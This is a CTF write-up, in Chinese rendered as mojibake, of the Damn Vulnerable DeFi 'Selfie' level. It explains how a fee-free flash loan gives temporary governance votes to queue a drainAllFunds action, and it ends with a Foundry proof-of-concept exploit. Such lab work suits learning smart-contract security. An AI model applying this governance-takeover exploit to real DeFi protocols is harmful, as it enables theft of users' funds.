# Selfie
> é¢˜ç›®é“¾æ¥ï¼šhttps://github.com/Chocolatieee0929/ContractSafetyStudy/tree/main/damn-vulnerable-defi/src/Contracts/selfie
## æ”»å‡»ç›®æ ‡
æ¥æºäº damn-vulnerable-defi/test/Levels/selfie/README.md
```
You start with no DVT tokens in balance, and the pool has 1.5 million. Your objective: take them all.
```
## åˆçº¦åˆ†æ

### `DamnValuableTokenSnapshot.sol`
è¿™ä»½åˆçº¦ç»§æ‰¿äº†`OpenZeppelin ERC20Snapshot`ï¼Œè¿™æ˜¯ozæ²»ç†ä»£å¸æ ‡å‡†çš„å®ç°ï¼Œæˆ‘åœ¨è¿™ç¯‡æ–‡ç« å¯¹ERC20Snapshot å’Œ ERC20Vote è¿›è¡Œäº†å­¦ä¹ ã€‚

| Function Name | Function Signature | Functionality |
| ------------- | ---------- | ------------------ | 
| snapshot | snapshot() | å…è®¸ä»»ä½•äººæ‹æ‘„å½“å‰DVTæ²»ç†ä»£å¸çš„å¿«ç…§ã€‚å®ƒå°†è¿”å›æ‹æ‘„çš„å¿«ç…§çš„IDã€‚
| getBalanceAtLastSnapshot |getBalanceAtLastSnapshot(address) | ä¸€ä¸ªè·å–å™¨å‡½æ•°ï¼Œè¿”å›æŒ‡å®šè´¦æˆ·åœ¨ä¸Šä¸€ä¸ªå¿«ç…§æ—¶çš„ä½™é¢ã€‚
| getTotalSupplyAtLastSnapshot | getTotalSupplyAtLastSnapshot() | ä¸€ä¸ªè·å–å™¨å‡½æ•°ï¼Œè¿”å›ä¸Šä¸€ä¸ªå¿«ç…§æ—¶æ²»ç†ä»£å¸çš„æ€»ä¾›åº”é‡ã€‚

è¿™ä¸ªä»£å¸è¢«SelfiePoolSimpleGovernanceå’ŒSelfiePoolåŒæ—¶ä½¿ç”¨ï¼š
1. SelfiePoolæä¾› DVT çš„é—ªç”µè´·ï¼›
2. SimpleGovernanceä½¿ç”¨DVTä»£å¸æ¥æ£€æŸ¥ç”¨æˆ·æ˜¯å¦æ‹¥æœ‰è¶³å¤Ÿçš„æŠ•ç¥¨æƒï¼ˆç”¨æˆ·ä½™é¢å¿…é¡»è¶…è¿‡ä¸Šä¸€ä¸ªå¿«ç…§ä¸­DVTä»£å¸æ€»ä¾›åº”é‡çš„ä¸€åŠï¼‰æ¥æ’é˜Ÿä¸€ä¸ªæ“ä½œã€‚

### `SimpleGovernance.sol`
è¿™æ˜¯ä¸€ä¸ªç®€å•çš„æ²»ç†åˆçº¦ï¼Œå®ƒä½¿ç”¨DVTä»£å¸æ¥æ£€æŸ¥ç”¨æˆ·æ˜¯å¦æ‹¥æœ‰è¶³å¤Ÿçš„æŠ•ç¥¨æƒï¼ˆç”¨æˆ·ä½™é¢å¿…é¡»è¶…è¿‡ä¸Šä¸€ä¸ªå¿«ç…§ä¸­DVTä»£å¸æ€»ä¾›åº”é‡çš„ä¸€åŠï¼‰æ¥æ’é˜Ÿä¸€ä¸ªæ“ä½œã€‚

| Function Name | Function Signature | Functionality |
| ------------- | ------------------ | --------------|
| queueAction | queueAction(address,bytes,uint256) |å°†å‘é˜Ÿåˆ—ä¸­æ·»åŠ ä¸€ä¸ªææ¡ˆã€‚åªæœ‰ææ¡ˆè€…æ‹¥æœ‰è¶³å¤Ÿçš„æŠ•ç¥¨æƒï¼ˆåœ¨ä¸Šæ¬¡å¿«ç…§æ—¶é—´æ‹¥æœ‰è¶…è¿‡DVTæ€»ä¾›åº”é‡çš„ä¸€åŠï¼‰å¹¶ä¸”æ¥æ”¶è€…ä¸æ˜¯æ²»ç†åˆçº¦æœ¬èº«msg.senderæ—¶ï¼Œææ¡ˆæ‰ä¼šè¢«æ·»åŠ ã€‚
| executeAction | executeAction(uint256) | åªæœ‰åœ¨ææ¡ˆæ—¶é—´è¿‡å»è¶³å¤Ÿé•¿çš„æ—¶é—´ï¼ˆè‡³å°‘ä¸¤å¤©ï¼‰æ‰ä¼šè¢«æ‰§è¡Œã€‚
| getActionDelay | getActionDelay() | è¿”å›ææ¡ˆå»¶è¿Ÿæ—¶é—´

1. `queueAction`
æˆ‘ä»¬æ³¨æ„åˆ°ï¼Œæƒ³è¦æå‡ºçš„ææ¡ˆå¿…é¡»æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š
   1. ææ¡ˆè€…å¿…é¡»æ‹¥æœ‰è¶³å¤Ÿçš„æŠ•ç¥¨æƒï¼ˆåœ¨ä¸Šæ¬¡å¿«ç…§æ—¶é—´æ‹¥æœ‰è¶…è¿‡DVTæ€»ä¾›åº”é‡çš„ä¸€åŠï¼‰
   2. æ¥æ”¶è€…ä¸èƒ½æ˜¯æ²»ç†åˆçº¦æœ¬èº«msg.sender
   
    ç¬¬ä¸€ç‚¹ç”±äºæ²¡æœ‰å¯¹æŒæœ‰ä»£å¸æ—¶é—´çš„é™åˆ¶ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡é—ªç”µè´·æ¥ç»•è¿‡ç¬¬ä¸€ç‚¹çš„æ£€æŸ¥ã€‚

1. `executeAction`
æˆ‘ä»¬æ³¨æ„åˆ°`executeAction`æ˜¯é€šè¿‡å¤–éƒ¨è°ƒç”¨æ‰§è¡Œææ¡ˆï¼Œ
```
    function executeAction(uint256 actionId) external payable {
        // æ£€ææ¡ˆæ˜¯å¦å¯ä»¥è¢«æ‰§è¡Œ
        if (!_canBeExecuted(actionId)) revert CannotExecuteThisAction();

        GovernanceAction storage actionToExecute = actions[actionId];
        // æ›´æ–°è¡ŒåŠ¨çš„æ‰§è¡Œæ—¶é—´æˆ³
        actionToExecute.executedAt = block.timestamp;

->      actionToExecute.receiver.functionCallWithValue(actionToExecute.data, actionToExecute.weiAmount);

        emit ActionExecuted(actionId, msg.sender);
    }
```
ç®€å•æ¥è¯´ï¼Œé€šè¿‡ä¸€å®šæ—¶é—´çš„ææ¡ˆé€šè¿‡è°ƒç”¨ææ¡ˆä¸­çš„`receiver`ï¼Œé€šè¿‡functionCallWithValue å¤–éƒ¨è°ƒç”¨calldatatï¼ˆdataï¼‰æ¥æ‰§è¡Œææ¡ˆã€‚

### `SelfiePool.sol`
è¿™æ˜¯ä¸€ä¸ªç®€å•çš„å€Ÿè´·åˆçº¦ï¼Œå…¶ä¸­å­˜å…¥äº†150ä¸‡DVTä»£å¸ï¼Œå…·æœ‰æ— è´¹ç”¨çš„é—ªç”µè´·æ–¹æ³•ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜æä¾›äº†`drainAllFunds`å‡½æ•°ï¼Œè¯¥å‡½æ•°è¢«æ²»ç†å‡½æ•°ä¿®é¥°ã€‚
```
    modifier onlyGovernance() {
        if (msg.sender != address(governance)) revert OnlyGovernanceAllowed();
        _;
    }

    function drainAllFunds(address receiver) external onlyGovernance {
        uint256 amount = token.balanceOf(address(this));
        token.transfer(receiver, amount);

        emit FundsDrained(receiver, amount);
    }
```
åªèƒ½ç”±æ²»ç†åˆçº¦è¿›è¡Œè°ƒç”¨ï¼Œç»“åˆä¸Šè¿°`SimpleGovernance.sol`çš„`executeAction`å‡½æ•°ï¼Œæˆ‘ä»¬ä¸éš¾æƒ³åˆ°ï¼Œå¯ä»¥é€šè¿‡ä½¿ç”¨ææ¡ˆæ¥ä½¿æ²»ç†åˆçº¦è°ƒç”¨`drainAllFunds`å‡½æ•°ï¼Œå°†dvtå…¨éƒ¨è½¬ç»™æ”»å‡»è€…ã€‚


ç»¼ä¸Šï¼Œæˆ‘ä»¬é€šè¿‡åˆ†æåˆçº¦ï¼Œå¯ä»¥æ‰¾åˆ°åˆçº¦è–„å¼±ç‚¹å¦‚ä¸‹ï¼š
1. `DamnValuableTokenSnapshot.sol` æ”»å‡»åˆçº¦é€šè¿‡`snapshot()`æ¥å¯¹DVTè¿›è¡Œå¿«ç…§ï¼Œè¿™å—æ²¡æœ‰å¯¹æ—¶é—´è¿›è¡Œçº¦æŸï¼›
2. `SimpleGovernance.sol` é€šè¿‡`executeAction`æ¥æ‰§è¡Œreceiverçš„å¤–éƒ¨è°ƒç”¨æ¥å®ç°ææ¡ˆæ‰§è¡Œé€»è¾‘ã€‚

## æ”»å‡»æ­¥éª¤
1. é€šè¿‡é—ªç”µè´·å€Ÿæ¬¾ï¼Œé€šè¿‡`dvtSnapshot.snapshot()`è·å–æŠ•ç¥¨èµ„æ ¼ï¼›
2. å‘èµ·queueActionï¼Œå°†receiverè®¾ç½®ä¸ºslefiePoolï¼Œå¹¶å°†ææ¬¾ç»™attackeré€»è¾‘è½¬æ¢æˆcalldataï¼Œè½¬æ¢æˆææ¡ˆï¼›
3. å½’è¿˜é—ªç”µè´·
4. æ¨¡æ‹Ÿæ—¶é—´æµå¤±ï¼Œæ‰§è¡ŒActionï¼Œæ”»å‡»æˆåŠŸã€‚
    æ³¨ï¼šå‰1-3æ­¥åœ¨é—ªç”µè´·å½’è¿˜å‡½æ•°é‡Œå®ç°

## PoC
```
    function testExploit() public {
        selfiePool.flashLoan(TOKENS_IN_POOL);
        vm.warp(block.timestamp + 3 days);
        simpleGovernance.executeAction(actionId);
        
        validation();
        console.log(unicode"\nğŸ‰ Congratulations, you can go to the next level! ğŸ‰");
    }

    function receiveTokens(address token, uint256 amount) external {
        // This function is called by the token contract when tokens are transferred to it (via `transferAndCall`)
        require(
            token == address(dvtSnapshot),
            "The token must be DVT"
        );
        /* 
         * 2. å‘èµ·queueActionï¼Œè°ƒç”¨slefiePoolçš„å–æ¬¾ï¼Œå°†é’±è½¬ç»™attacker
         * 3. å½’è¿˜é—ªç”µè´· 
         */
        dvtSnapshot.snapshot();
        dvtSnapshot.snapshot();
        dvtSnapshot.snapshot();
        actionId = simpleGovernance.queueAction(address(selfiePool), abi.encodeWithSignature("drainAllFunds(address)", address(attacker)), 0);
        dvtSnapshot.transfer(msg.sender, amount);
        
    }
```
å®Œæ•´çš„PoCä»£ç è§[è¿™é‡Œ](https://github.com/Daemon-Labs/damn-vulnerable-defi/blob/main/src/6.Selfie/SelfieAttacker.sol)